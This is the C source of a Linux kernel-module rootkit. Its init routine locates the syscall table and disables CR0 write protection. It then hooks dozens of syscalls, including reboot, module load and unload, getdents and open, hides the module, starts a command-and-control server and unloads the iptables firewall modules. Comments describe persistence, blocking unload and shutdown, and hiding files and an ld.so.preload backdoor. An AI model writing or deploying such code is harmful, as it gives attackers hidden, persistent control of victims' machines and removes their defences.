/*
 * Author: Daniel Liscinsky
 */



//#include <linux/tty.h>      /* console_print() interface */

#include <linux/moduleparam.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>

#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/version.h> 
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#include <linux/mman.h>
#include <asm/proto.h>
#include <asm/delay.h>
#include <linux/highmem.h>
#include <asm/desc.h>
#include <linux/unistd.h>
#include <linux/mutex.h>

struct mutex claim_in_syscall_mutex;
struct timespec end;

#include "hooked_kernel_syscalls.h"
#include "hooked_kernel_syscalls.c"
#include "kernel_rootkit_actions.h"
#include "kernel_rootkit_actions.c"
#include "c2_server.h"
#include "c2_server.c"
//#include "forward_router.h"
//#include "forward_router.c"

#include "debug.h"



//MODULE_LICENSE("Copyright / Restricted");
MODULE_AUTHOR("dl");
MODULE_DESCRIPTION("RKT");



#define BACKDOOR_SO_FILE	"backdoor.so"
#define LD_SO_PRELOAD_FILE	"ld.so.preload"
#define BUFSIZE				4096



unsigned long cr0;
static unsigned long *__sys_call_table;




/*

int __init chdir_init(void){
	unsigned int l;
	pte_t *pte;
	syscall_table = (void **) find_syscall_table();
	if(syscall_table == NULL) {
		printk(KERN_ERR"Syscall table is not found\n");
		return -1;
	}
	printk("Syscall table found: %p\n",syscall_table);
	pte = lookup_address((long unsigned int)syscall_table,&l);
	pte->pte |= _PAGE_RW;
	real_chdir =  syscall_table[__NR_chdir];
	syscall_table[__NR_chdir] = chdir_patch;
	printk("Patched!\nOLD :%p\nIN-TABLE:%p\nNEW:%p\n",
	real_chdir, syscall_table[__NR_open],chdir_patch);
	return 0;
}
*/

/*
static struct file_operations chdir_ops;
void (*syscall_handler)(void);
unsigned long real_addr,patchr;
unsigned int *idt_base;
gate_desc *orig_syscall;

void
patch(void){
	printk("Good Body\n");
}
void
fake_syscall_dispatcher(void){
	// steps:
	//	1- reverse the stdcall stack frame instructions
	//	2- store the stack frame
	//	3- do [Nice] things
	//	4- restore stack frame
	// 	5- call system call
	
	__asm__ __volatile__ (
		"movl %ebp,%esp\n"
		"pop %ebp\n");
	__asm__ __volatile__ (
		".global fake_syscall\n"
		".align 4,0x90\n"
	);

	__asm__ __volatile__ (
		"fake_syscall:\n"
		"pushl %ds\n"
		"pushl %eax\n"
		"pushl %ebp\n"
		"pushl %edi\n"
		"pushl %esi\n"
		"pushl %edx\n"
		"pushl %ecx\n"
		"pushl %ebx\n"
		"xor %ebx,%ebx\n");

	__asm__ __volatile__ (
		"movl $12,%ebx\n"
		"cmpl %eax,%ebx\n"
		"jne done\n"
	);
	__asm__ __volatile__(
		"\tmov %esp,%edx\n"
		"\tmov %esp, %eax\n"
		"\tpushl %eax\n"
		"\tpush %edx\n"
	);
	__asm__ __volatile__(
		"\tcall *%0\n"
		"\tpop %%ebp\n"
		"\tpop %%edx\n"
		"\tmovl %%edx,%%esp\n"
		"done:\n"
		"\tpopl %%ebx\n"
		"\tpopl %%ecx\n"
		"\tpopl %%edx\n"
		"\tpopl %%esi\n"
		"\tpopl %%edi\n"
		"\tpopl %%ebp\n"
		"\tpopl %%eax\n"
		"\tpopl %%ds\n"
		"\tjmp *%1\n"
		:: "m" (patchr), "m"(syscall_handler));
}

int chdir_init(void){
	// Interrupt descriptor base address of idt_table
	struct desc_ptr idtr;
	unsigned long syscall_disp;
	gate_desc  *new_syscall;

	new_syscall = (gate_desc *)kmalloc(sizeof(gate_desc), GFP_KERNEL);
	orig_syscall = (gate_desc *)kmalloc(sizeof(gate_desc), GFP_KERNEL);

	store_idt(&idtr);
	idt_base = (unsigned int *)idtr.address;

	// Two ways,
	// 1- extract syscall handler address from idt table
	// 2- register interrupt and hook it with syscall handler
	// METHOD 1:
	//
	patchr = (unsigned long) patch;
	*orig_syscall = ((gate_desc *) idt_base)[0x80];

	// System call dispatcher address
	syscall_disp = (orig_syscall->offset_high << 32) | (orig_syscall->offset_middle << 16) | (orig_syscall->offset_low);
	*((unsigned int *) &syscall_handler) = syscall_disp;
	real_addr = syscall_disp;

	//construct new gate_desc for fake dispatcher
	
#ifdef CONFIG_X86_64
	// copy segment descriptor from original syscall dispatcher gatedesc
	new_syscall->segment = orig_syscall->segment;

	// copy flags from the original syscall dispatcher
	//new_syscall->b = (orig_syscall->b & 0x0000FFFF);
	new_syscall->offset_low = (unsigned int) (((unsigned int)fake_syscall_dispatcher) & 0x0000FFFF);
	new_syscall->offset_middle = (unsigned int) (((unsigned int)fake_syscall_dispatcher) & 0xFFFF0000);
	new_syscall->offset_high = (unsigned int) (((unsigned int)fake_syscall_dispatcher) & 0xFFFFFFFF00000000);
#else
	// copy segment descriptor from original syscall dispatcher gatedesc
	new_syscall->a = (orig_syscall->a & 0xFFFF0000);

	// copy flags from the original syscall dispatcher
	new_syscall->b = (orig_syscall->b & 0x0000FFFF);
	new_syscall->a |=(unsigned int) (((unsigned int)fake_syscall_dispatcher) & 0x0000FFFF);
	new_syscall->b |=(unsigned int) (((unsigned int)fake_syscall_dispatcher) & 0xFFFF0000);
	
	printk("Old desc [a]=%x\t[b]=%x\t[addr]=%p\n",
		orig_syscall->a,orig_syscall->b,orig_syscall);
	printk("New desc [a]=%x\t[b]=%x\t[addr]=%p\n\n",
		new_syscall->a,new_syscall->b,&new_syscall);
	printk("Old desc [a]=%x\t[b]=%x\t[addr]=%p\n",
		orig_syscall->a,orig_syscall->b,((gate_desc *) idt_base)[80]);
	printk("New desc [a]=%x\t[b]=%x\t[addr]=%p\n",
		new_syscall->a,new_syscall->b,new_syscall);
	printk("Old:%p\tNew:%p\n",
		fake_syscall_dispatcher,syscall_handler);	
#endif

	((gate_desc *)idt_base)[0x80] = *new_syscall;
	// Overwrite idt syscall dispatcher desc with ours

	return 0;
}
*/

/**
 * Set a page writeable.
 */
/*int make_rw(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	pte->pte |= _PAGE_RW;
	return 0;
}

/**
 * Set a page read only.
 */
/*int make_ro(unsigned long address)
{ 
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	pte->pte = pte->pte & ~_PAGE_RW;
	return 0;
}
*/

static inline void protect_memory(void) {
	write_cr0(cr0);
}

static inline void unprotect_memory(void) {
	write_cr0(cr0 & ~0x00010000);
}

unsigned long * get_syscall_table_bf(void) {
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}



/* Initialize the LKM */
int init_module() {

	DEBUG_pr_info("Loading RKT kernel module...\n");

	/*
	 * Hide module.
	 *
	 * To some extent, this prevents the module from being unloaded since, 
	 * as far as the system is concerned, this module is does not exist and 
	 * it cannot unload that which is 'not' currently loaded.
	 */
#ifndef ALLOW_MODULE_UNLOAD
	hide_module();
#endif
	

	/*
	 * Several of the system calls overriden are crucial to maintaining 
	 * persistance and protecting the kernel module. In particular, the 
	 * reboot() syscall is important to hook as soon as possible to prevent 
	 * the machine from being shutdown, since this kernel module will be 
	 * unloaded in the process and not reloaded on boot. 
	 * 
	 * Additional, more permanent persistance, namely having this kernel 
	 * module be loaded on boot, is setup/installed by the installer before 
	 * this module is first loaded.
	 */
	
	// Get syscall table
	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;	//TODO more error handling

	cr0 = read_cr0();


	// Hook persistance syscalls first
	orig_reboot = (__reboot_t) __sys_call_table[__NR_reboot];
	orig_delete_module = (__delete_module_t) __sys_call_table[__NR_delete_module];
	orig_init_module = (__init_module_t) __sys_call_table[__NR_init_module];
	orig_finit_module = (__finit_module_t)__sys_call_table[__NR_finit_module];

	unprotect_memory();
	__sys_call_table[__NR_reboot]			= (unsigned long)hooked_reboot;
	__sys_call_table[__NR_delete_module]	= (unsigned long)hooked_delete_module;
	__sys_call_table[__NR_init_module]		= (unsigned long)hooked_init_module;
	__sys_call_table[__NR_finit_module]		= (unsigned long)hooked_finit_module;
	protect_memory();


	// Initialize rootkit state variables (used in various hooked functions)
//	INIT_LIST_HEAD(&hidden_inodes_list);
	// Initialize the mutex
	mutex_init(&claim_in_syscall_mutex);
	getnstimeofday(&end);

	
	// --------------------------------------------------------------------------
	//						Save original syscall functions
	// --------------------------------------------------------------------------
	orig_access = (__access_t)__sys_call_table[__NR_access];
	orig_faccessat = (__faccessat_t) __sys_call_table[__NR_faccessat];

	orig_chmod = (__chmod_t)__sys_call_table[__NR_chmod];
	orig_fchmodat = (__fchmodat_t)__sys_call_table[__NR_fchmodat];

	orig_creat = (__creat_t) __sys_call_table[__NR_creat];

	orig_execve = (__execve_t) __sys_call_table[__NR_execve];
//	orig_execveat = (__execveat_t) __sys_call_table[__NR_execveat];

	orig_stat = (__stat_t) __sys_call_table[__NR_stat];
	//orig_fstat = (__fstat_t) __sys_call_table[__NR_fstat];
	orig_lstat = (__lstat_t) __sys_call_table[__NR_lstat];
	//orig_stat64 = (__stat64_t) __sys_call_table[__NR_stat64];					//__NR_stat64 does not exist
	//orig_fstat64 = (__fstat64_t) __sys_call_table[__NR_fstat64];
	//orig_lstat64 = (__lstat64_t) __sys_call_table[__NR_lstat64];				//__NR_lstat64 does not exist
	//orig_fstatat = (__fstatat_t) __sys_call_table[__NR_fstatat];				//__NR_fstatat does not exist
	//orig_fstatat64 = (__fstatat64_t) __sys_call_table[__NR_fstatat64];		//__NR_fstatat64  does not exist
	//orig_statx = (__statx_t) __sys_call_table[__NR_statx];					//__NR_statx does not exist

	orig_truncate = (__truncate_t) __sys_call_table[__NR_truncate];
	//orig_ftruncate = (__ftruncate_t) __sys_call_table[__NR_ftruncate];
	//orig_truncate64 = (__truncate64_t) __sys_call_table[__NR_truncate64];		 //__NR_truncate64 does not exist
	//orig_ftruncate64 = (__ftruncate64_t) __sys_call_table[__NR_ftruncate64];

	orig_getdents = (__getdents_t) __sys_call_table[__NR_getdents];
	orig_getdents64 = (__getdents64_t) __sys_call_table[__NR_getdents64];
	orig_kexec_load = (__kexec_load_t) __sys_call_table[__NR_kexec_load];
//	orig_kexec_file_load = (__kexec_file_load_t) __sys_call_table[__NR_kexec_file_load];
	orig_kill = (__kill_t) __sys_call_table[__NR_kill];
	
	orig_open = (__open_t) __sys_call_table[__NR_open];
	orig_openat = (__openat_t) __sys_call_table[__NR_openat];

	orig_name_to_handle_at = (__name_to_handle_at_t) __sys_call_table[__NR_name_to_handle_at];
	//orig_open_by_handle_at = (__open_by_handle_at_t) __sys_call_table[__NR_open_by_handle_at];

	//orig_ptrace = (__ptrace_t) __sys_call_table[__NR_ptrace];
	//orig_read = (__read_t) __sys_call_table[__NR_read];
	//orig_readdir = (__readdir_t) __sys_call_table[__NR_readdir];

	orig_readlink = (__readlink_t) __sys_call_table[__NR_readlink];
	orig_readlinkat = (__readlinkat_t) __sys_call_table[__NR_readlinkat];

	//orig_recv = (__recv_t) __sys_call_table[__NR_recv];						//__NR_recv does not exist
	orig_recvfrom = (__recvfrom_t) __sys_call_table[__NR_recvfrom];
	orig_recvmsg = (__recvmsg_t) __sys_call_table[__NR_recvmsg];
	//orig_recvmmsg = (__recvmmsg_t) __sys_call_table[__NR_recvmmsg];

	orig_rename = (__rename_t) __sys_call_table[__NR_rename];
	orig_renameat = (__renameat_t) __sys_call_table[__NR_renameat];
//	orig_renameat2 = (__renameat2_t) __sys_call_table[__NR_renameat2];

	orig_rmdir = (__rmdir_t) __sys_call_table[__NR_rmdir];

	//orig_send = (__send_t) __sys_call_table[__NR_send];						//__NR_send does not exist
	orig_sendto = (__sendto_t) __sys_call_table[__NR_sendto];
	orig_sendmsg = (__sendmsg_t) __sys_call_table[__NR_sendmsg];
	//orig_sendmmsg = (__sendmmsg_t) __sys_call_table[__NR_sendmmsg];

	//orig_getsockopt = (__getsockopt_t) __sys_call_table[__NR_getsockopt];
	//orig_setsockopt = (__setsockopt_t) __sys_call_table[__NR_setsockopt];
	//orig_shutdown = (__shutdown_t) __sys_call_table[__NR_shutdown];
	//orig_socketcall = (__socketcall_t) __sys_call_table[__NR_socketcall];

	orig_swapon = (__swapon_t) __sys_call_table[__NR_swapon];
	orig_swapoff = (__swapoff_t) __sys_call_table[__NR_swapoff];

	orig_symlink = (__symlink_t) __sys_call_table[__NR_symlink];
	orig_symlinkat = (__symlinkat_t) __sys_call_table[__NR_symlinkat];

	orig_unlink = (__unlink_t) __sys_call_table[__NR_unlink];
	orig_unlinkat = (__unlinkat_t) __sys_call_table[__NR_unlinkat];

	orig_utime = (__utime_t) __sys_call_table[__NR_utime];
	orig_utimes = (__utimes_t) __sys_call_table[__NR_utimes];
	orig_utimensat = (__utimensat_t) __sys_call_table[__NR_utimensat];
	//orig_futimens = (__futimens_t) __sys_call_table[__NR_futimens];

	//orig_write = (__write_t) __sys_call_table[__NR_write];
	

	// --------------------------------------------------------------------------
	//							Hook syscall functions
	// --------------------------------------------------------------------------
	unprotect_memory();
	__sys_call_table[__NR_access]			= (unsigned long)hooked_access;
	__sys_call_table[__NR_faccessat]		= (unsigned long)hooked_faccessat;

	__sys_call_table[__NR_chmod]			= (unsigned long)hooked_chmod;
	__sys_call_table[__NR_fchmodat]			= (unsigned long)hooked_fchmodat;

	__sys_call_table[__NR_creat]			= (unsigned long)hooked_creat;

//	__sys_call_table[__NR_execve]			= (unsigned long)hooked_execve;
//	__sys_call_table[__NR_execveat]			= (unsigned long)hooked_execveat;

	__sys_call_table[__NR_stat]				= (unsigned long)hooked_stat;
	//__sys_call_table[__NR_fstat]			= (unsigned long)hooked_fstat;
	__sys_call_table[__NR_lstat]			= (unsigned long)hooked_lstat;
	//__sys_call_table[__NR_stat64]			= (unsigned long)hooked_stat64;					//__NR_stat64 does not exist
	//__sys_call_table[__NR_fstat64]		= (unsigned long)hooked_fstat64;
	//__sys_call_table[__NR_lstat64]		= (unsigned long)hooked_lstat64;				//__NR_lstat64 does not exist
	//__sys_call_table[__NR_fstatat]		= (unsigned long)hooked_fstatat;				//__NR_fstatat does not exist
	//__sys_call_table[__NR_fstatat64]		= (unsigned long)hooked_fstatat64;				//__NR_fstatat64  does not exist
	//__sys_call_table[__NR_statx]			= (unsigned long)hooked_statx;					//__NR_statx does not exist

	__sys_call_table[__NR_truncate]			= (unsigned long)hooked_truncate;
	//__sys_call_table[__NR_ftruncate]		= (unsigned long)hooked_ftruncate;
	//__sys_call_table[__NR_truncate64]		= (unsigned long)hooked_truncate64;				//__NR_truncate64 does not exist
	//__sys_call_table[__NR_ftruncate64] 	= (unsigned long)hooked_ftruncate64;

	__sys_call_table[__NR_getdents]			= (unsigned long)hooked_getdents;
	__sys_call_table[__NR_getdents64]		= (unsigned long)hooked_getdents64;
	__sys_call_table[__NR_kexec_load]		= (unsigned long)hooked_kexec_load;
//	__sys_call_table[__NR_kexec_file_load]	= (unsigned long)hooked_kexec_file_load;
	__sys_call_table[__NR_kill]				= (unsigned long)hooked_kill;
	
	__sys_call_table[__NR_open]				= (unsigned long)hooked_open;
	__sys_call_table[__NR_openat]			= (unsigned long)hooked_openat;

	__sys_call_table[__NR_name_to_handle_at] = (unsigned long)hooked_name_to_handle_at;
	//__sys_call_table[__NR_open_by_handle_at] = (unsigned long)hooked_open_by_handle_at;

	//__sys_call_table[__NR_ptrace]			= (unsigned long)hooked_ptrace;
	//__sys_call_table[__NR_read]			= (unsigned long)hooked_read;
	//__sys_call_table[__NR_readdir]		= (unsigned long)hooked_readdir;

	__sys_call_table[__NR_readlink]			= (unsigned long)hooked_readlink;
	__sys_call_table[__NR_readlinkat]		= (unsigned long)hooked_readlinkat;

	//__sys_call_table[__NR_recv]			= (unsigned long)hooked_recv;					//__NR_recv does not exist
	//__sys_call_table[__NR_recvfrom]		= (unsigned long)hooked_recvfrom;
	//__sys_call_table[__NR_recvmsg]		= (unsigned long)hooked_recvmsg;
	//__sys_call_table[__NR_recvmmsg]		= (unsigned long)hooked_recvmmsg;

	__sys_call_table[__NR_rename]			= (unsigned long)hooked_rename;
	__sys_call_table[__NR_renameat]			= (unsigned long)hooked_renameat;
//	__sys_call_table[__NR_renameat2]		= (unsigned long)hooked_renameat2;

	__sys_call_table[__NR_rmdir]			= (unsigned long)hooked_rmdir;

	//__sys_call_table[__NR_send]			= (unsigned long)hooked_send;					//__NR_send does not exist
	__sys_call_table[__NR_sendto]			= (unsigned long)hooked_sendto;
	__sys_call_table[__NR_sendmsg]			= (unsigned long)hooked_sendmsg;
	//__sys_call_table[__NR_sendmmsg]		= (unsigned long)hooked_sendmmsg;

	//__sys_call_table[__NR_getsockopt]		= (unsigned long)hooked_getsockopt;
	//__sys_call_table[__NR_setsockopt]		= (unsigned long)hooked_setsockopt;
	//__sys_call_table[__NR_shutdown]		= (unsigned long)hooked_shutdown;
	//__sys_call_table[__NR_socketcall]		= (unsigned long)hooked_socketcall;

	__sys_call_table[__NR_swapon]			= (unsigned long)hooked_swapon;
	__sys_call_table[__NR_swapoff]			= (unsigned long)hooked_swapoff;

	__sys_call_table[__NR_symlink]			= (unsigned long)hooked_symlink;
	__sys_call_table[__NR_symlinkat]		= (unsigned long)hooked_symlinkat;

	__sys_call_table[__NR_unlink]			= (unsigned long)hooked_unlink;
	__sys_call_table[__NR_unlinkat]			= (unsigned long)hooked_unlinkat;

	__sys_call_table[__NR_utime]			= (unsigned long)hooked_utime;
	__sys_call_table[__NR_utimes]			= (unsigned long)hooked_utimes;
	__sys_call_table[__NR_utimensat]		= (unsigned long)hooked_utimensat;
	//__sys_call_table[__NR_futimens]		= (unsigned long)hooked_futimens;

	//__sys_call_table[__NR_write]			= (unsigned long)hooked_write;
	protect_memory();
	

	// Make module persistant on reboot
	//...


	// Hide related module files
	//TODO hide in filesystem
	//		/etc/modules
	//		/etc/modprobe.d/blacklist.conf
	//		/lib/modules/?/kernel/drivers/?/<
	//		/etc/ld.so.preload
	//...


	// Copy the installer (if present) to a more permanent place



	
	// Start command & control (c2) server
	if (start_c2_server() < 0) {

		// This is bad, but not fatal
		DEBUG_pr_info("Failed to start c2 server\n");

		//TODO mark to try and setup c2 server again later
		//TODO advanced error anaylsis & resolution to solve the root cause of the problem so that the operation succeeds
	}
	/*
	// Start TODO
	if (start_routing() < 0) {

		// This is bad, but not fatal
		DEBUG_pr_info("Failed to start routing process\n");

		//TODO mark to try and setup routing process again later
		//TODO advanced error anaylsis & resolution to solve the root cause of the problem so that the operation succeeds
	}
	*/


	// Unload iptables modules
	mm_segment_t fs = get_fs();
	set_fs(KERNEL_DS);
	orig_delete_module("iptable_filter", O_NONBLOCK);
	orig_delete_module("ip_tables", O_NONBLOCK);
	orig_delete_module("x_tables", O_NONBLOCK);
	set_fs(fs);

	/*
	old_fs = get_fs();
	set_fs(get_ds());

	// Stupid umasks...
	sys_chmod(path, 0777);

	set_fs(old_fs);
	*/


	DEBUG_pr_info("Successfully loaded RKT kernel module\n");
	/* If we return a non zero value, it means that 
	* init_module failed and the LKM can't be loaded */
	return 0;
}



//#ifdef ALLOW_MODULE_UNLOAD // Do not define an exit function in the production build
/* 
 * Cleanup - undo whatever init_module() did.
 * 
 * Only needed for debugging; the real vesion is never unloaded.
 */
void cleanup_module() {
	/*
	// Stop the routing process
	if (stop_routing() < 0) {
		//TODO handle
	}
	else{
		DEBUG_pr_info("Stopped the routing process\n");
	}	
	*/
	// Stop the c2 server
	if (stop_c2_server() < 0) {
		//TODO handle
	}
	else{
		DEBUG_pr_info("Stopped the c2 server\n");
	}
	
	// Restore original functions
	unprotect_memory();
	__sys_call_table[__NR_reboot]			= (unsigned long)orig_reboot;	
	__sys_call_table[__NR_delete_module]	= (unsigned long)orig_delete_module;
	__sys_call_table[__NR_init_module]		= (unsigned long)orig_init_module;
	__sys_call_table[__NR_finit_module]		= (unsigned long)orig_finit_module;



	__sys_call_table[__NR_access]			= (unsigned long)orig_access;
	__sys_call_table[__NR_faccessat]		= (unsigned long)orig_faccessat;

	__sys_call_table[__NR_chmod]			= (unsigned long)orig_chmod;
	__sys_call_table[__NR_fchmodat]			= (unsigned long)orig_fchmodat;

	__sys_call_table[__NR_creat]			= (unsigned long)orig_creat;

	__sys_call_table[__NR_execve]			= (unsigned long)orig_execve;
//	__sys_call_table[__NR_execveat]			= (unsigned long)orig_execveat;

	__sys_call_table[__NR_stat]				= (unsigned long)orig_stat;
	//__sys_call_table[__NR_fstat]			= (unsigned long)orig_fstat;
	__sys_call_table[__NR_lstat]			= (unsigned long)orig_lstat;
	//__sys_call_table[__NR_stat64]			= (unsigned long)orig_stat64;				//__NR_stat64 does not exist
	//__sys_call_table[__NR_fstat64]		= (unsigned long)orig_fstat64;
	//__sys_call_table[__NR_lstat64]		= (unsigned long)orig_lstat64;				//__NR_lstat64 does not exist
	//__sys_call_table[__NR_fstatat]		= (unsigned long)orig_fstatat;				//__NR_fstatat does not exist
	//__sys_call_table[__NR_fstatat64]		= (unsigned long)orig_fstatat64;			//__NR_fstatat64  does not exist
	//__sys_call_table[__NR_statx]			= (unsigned long)orig_statx;				//__NR_statx does not exist

	__sys_call_table[__NR_truncate]			= (unsigned long)orig_truncate;
	//__sys_call_table[__NR_ftruncate]		= (unsigned long)orig_ftruncate;
	//__sys_call_table[__NR_truncate64]		= (unsigned long)orig_truncate64;			//__NR_truncate64 does not exist
	//__sys_call_table[__NR_ftruncate64] 	= (unsigned long)orig_ftruncate64;

	__sys_call_table[__NR_getdents]			= (unsigned long)orig_getdents;
	__sys_call_table[__NR_getdents64]		= (unsigned long)orig_getdents64;
	__sys_call_table[__NR_kexec_load]		= (unsigned long)orig_kexec_load;
//	__sys_call_table[__NR_kexec_file_load]	= (unsigned long)orig_kexec_file_load;
	__sys_call_table[__NR_kill]				= (unsigned long)orig_kill;

	__sys_call_table[__NR_open]				= (unsigned long)orig_open;
	__sys_call_table[__NR_openat]			= (unsigned long)orig_openat;

	__sys_call_table[__NR_name_to_handle_at] = (unsigned long)orig_name_to_handle_at;
	//__sys_call_table[__NR_open_by_handle_at] = (unsigned long)orig_open_by_handle_at;

	//__sys_call_table[__NR_ptrace]			= (unsigned long)orig_ptrace;
	//__sys_call_table[__NR_read]			= (unsigned long)orig_read;
	//__sys_call_table[__NR_readdir]		= (unsigned long)orig_readdir;

	__sys_call_table[__NR_readlink]			= (unsigned long)orig_readlink;
	__sys_call_table[__NR_readlinkat]		= (unsigned long)orig_readlinkat;

	//__sys_call_table[__NR_recv]			= (unsigned long)orig_recv;					//__NR_recv does not exist
	__sys_call_table[__NR_recvfrom]			= (unsigned long)orig_recvfrom;
	__sys_call_table[__NR_recvmsg]			= (unsigned long)orig_recvmsg;
	//__sys_call_table[__NR_recvmmsg]		= (unsigned long)orig_recvmmsg;

	__sys_call_table[__NR_rename]			= (unsigned long)orig_rename;
	__sys_call_table[__NR_renameat]			= (unsigned long)orig_renameat;
	//__sys_call_table[__NR_renameat2]		= (unsigned long)orig_renameat2;

	__sys_call_table[__NR_rmdir]			= (unsigned long)orig_rmdir;

	//__sys_call_table[__NR_send]			= (unsigned long)orig_send;					//__NR_send does not exist
	__sys_call_table[__NR_sendto]			= (unsigned long)orig_sendto;
	__sys_call_table[__NR_sendmsg]			= (unsigned long)orig_sendmsg;
	//__sys_call_table[__NR_sendmmsg]		= (unsigned long)orig_sendmmsg;

	//__sys_call_table[__NR_getsockopt]		= (unsigned long)orig_getsockopt;
	//__sys_call_table[__NR_setsockopt]		= (unsigned long)orig_setsockopt;
	//__sys_call_table[__NR_shutdown]		= (unsigned long)orig_shutdown;
	//__sys_call_table[__NR_socketcall]		= (unsigned long)orig_socketcall;

	__sys_call_table[__NR_swapon]			= (unsigned long)orig_swapon;
	__sys_call_table[__NR_swapoff]			= (unsigned long)orig_swapoff;

	__sys_call_table[__NR_symlink]			= (unsigned long)orig_symlink;
	__sys_call_table[__NR_symlinkat]		= (unsigned long)orig_symlinkat;

	__sys_call_table[__NR_unlink]			= (unsigned long)orig_unlink;
	__sys_call_table[__NR_unlinkat]			= (unsigned long)orig_unlinkat;

	__sys_call_table[__NR_utime]			= (unsigned long)orig_utime;
	__sys_call_table[__NR_utimes]			= (unsigned long)orig_utimes;
	__sys_call_table[__NR_utimensat]		= (unsigned long)orig_utimensat;
	//__sys_call_table[__NR_futimens]		= (unsigned long)orig_futimens;

	//__sys_call_table[__NR_write]			= (unsigned long)orig_write;
	protect_memory();


	//((gate_desc *)idt_base)[0x80] = *orig_syscall;
	DEBUG_pr_info("Unloaded RKT kernel module\n");
}
//#endif